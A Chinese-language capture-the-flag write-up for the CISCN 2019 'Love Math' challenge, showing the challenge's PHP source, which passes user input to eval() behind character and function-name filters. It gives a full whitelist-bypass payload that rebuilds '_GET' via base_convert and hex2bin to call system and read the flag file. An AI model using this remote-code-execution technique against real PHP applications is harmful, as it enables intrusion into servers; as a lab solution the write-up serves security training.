# 原创
：  [CISCN 2019 初赛]Love Math

# [CISCN 2019 初赛]Love Math

#### [CISCN 2019 初赛]Love Math

## 考点

> 
RCE构造，白名单绕过


## 思路

> 
题目所给源码中过滤了很多内容，但是它允许我们通过PHP的数学函数来构造Payload


```
可以利用的数学函数
['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']

```

> 
这里我们注意到两个函数



> 
Payload的限制
- payload长度不能超过80- payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘"’, ‘`’, ‘[’, ‘]’ 这些字符- payload中不能有不是$whitelist白名单里面的单词出现


> 
我们利用 base_convert()函数来构造 hex2bin()函数，再结合 dechex()函数来得到 hex2bin需要执行的十六进制字符串，从而构造出 `_GET`


## Payload

> 
题目源码：


```
&lt;?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) &gt;= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}

```

> 
构造Payload：<br/> `$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac /flag`


```
base_convert(37907361743,10,36) =&gt; "hex2bin"
dechex(1598506324) =&gt; "5f474554"
$pi=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs}  //{}可以代替[]

```
